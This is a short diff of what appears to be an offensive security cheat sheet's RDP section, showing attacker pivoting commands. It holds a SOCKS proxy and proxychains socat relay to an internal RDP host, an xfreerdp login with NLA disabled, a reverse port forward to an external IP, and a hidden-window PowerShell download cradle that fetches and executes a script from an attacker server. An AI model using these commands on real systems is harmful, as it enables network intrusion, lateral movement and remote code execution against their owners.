@@ -28,12 +28,10 @@ PS C:\Users\Commando> [System.Convert]::ToBase64String([System.Text.Encoding]::u
 ###RDP
 ```
 socks 1337
-
 proxychains socat TCP4-LISTEN:3389,fork TCP4:10.0.0.100:3389
-
+ xfreerdp /v:127.0.0.1 -sec-nla /u:""
 rportfwd 8080 178.62.56.134 80
-
-powershell.exe -nop -w hidden -c "iex ((new-object net.webclient).downloadstring('http://10.0.1.200:8080/smb'))"
+powershell.exe -nop -w hidden -c iex ((new-object net.webclient).downloadstring('http://10.0.1.200:8080/smb'))
 
 
 ```
